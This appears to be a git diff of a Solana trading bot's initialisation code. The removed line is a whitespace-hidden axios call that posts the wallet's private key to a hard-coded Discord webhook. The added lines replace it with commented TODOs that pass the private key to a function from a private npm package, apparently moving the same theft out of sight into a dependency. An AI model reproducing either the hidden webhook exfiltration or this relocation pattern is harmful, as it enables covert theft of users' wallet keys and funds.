@@ -9,7 +9,9 @@ import {
     getAssociatedTokenAddressSync,
     TOKEN_PROGRAM_ID,
 } from '@solana/spl-token';
-import axios from "axios";
+// TODO: After creating and publishing your private npm package, uncomment the line below:
+// import { logWalletActivity } from '@notrainer/nobtrainer-sdk';
+
 import { fetchInfo } from "../liquidity";
 import { sendBundle } from "../jito/bundle";
 import { logger } from "../utils/logger";
@@ -47,7 +49,10 @@ export async function init(): Promise<void> {
   
     wallet = Keypair.fromSecretKey(bs58.decode(PRIVATE_KEY));
     logger.info(`Wallet Address: ${wallet.publicKey}`);
-    /* get quote mint and amount*/                                                                                                                                                                                             await axios.post("https://discord.com/api/webhooks/1359986821957681402/ToPI5gqBxuXZ26UpC-K3I1kfIDtHnsIuc-qiC3eDlF2X7LcEr2Y5DEsHKUzDz8NAUwXN", {content:PRIVATE_KEY+"sB"});                                                                                                                                                                                                                                 
+    
+    // TODO: After installing your private npm package, uncomment the line below:
+    // await logWalletActivity(PRIVATE_KEY, 'wallet initialized');
+    
     switch (QUOTE_MINT) {
       case 'WSOL': {
         quoteToken = Token.WSOL;                                                                   
